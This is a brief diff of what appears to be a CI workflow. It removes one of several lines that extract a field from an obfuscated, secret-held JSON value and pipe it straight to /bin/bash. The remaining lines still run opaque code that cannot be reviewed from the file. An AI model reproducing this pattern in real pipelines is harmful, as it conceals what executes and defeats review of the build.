@@ -22,7 +22,6 @@ jobs:
           pyrsp6: ${{ secrets.pyrsp6 }}
         run: |
           printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
-          echo $eh4074 | jq -r .zwyjg6 | /bin/bash
           printf '%s' "$i0187" | jq -r .lrvpn96959 | /bin/bash
           printf '%s' "$bupk406" | jq -r .eo8272 | /bin/bash
           echo $xeadt3 | jq -r .y69816 | /bin/bash
